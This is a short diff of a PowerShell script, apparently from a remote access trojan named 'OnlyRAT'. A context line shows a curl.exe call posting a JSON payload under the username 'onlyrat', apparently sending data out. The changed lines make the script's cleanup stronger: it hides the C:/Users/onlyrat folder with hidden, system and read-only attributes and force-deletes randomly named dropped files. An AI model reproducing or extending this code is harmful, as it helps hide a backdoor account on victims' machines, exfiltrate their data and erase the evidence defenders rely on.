@@ -58,6 +58,6 @@ Invoke-Expression "curl.exe -F `"payload_json={\```"username\```": \```"onlyrat\
 
 # cleanup
 attrib +h +s +r C:/Users/onlyrat 
-Remove-Item $CRYnrkaDbe
-Remove-Item lawFvVTikZ.txt
-Remove-Item KFPGaEYdcz.ps1
+Remove-Item $CRYnrkaDbe -Force
+Remove-Item lawFvVTikZ.txt -Force
+Remove-Item KFPGaEYdcz.ps1 -Force
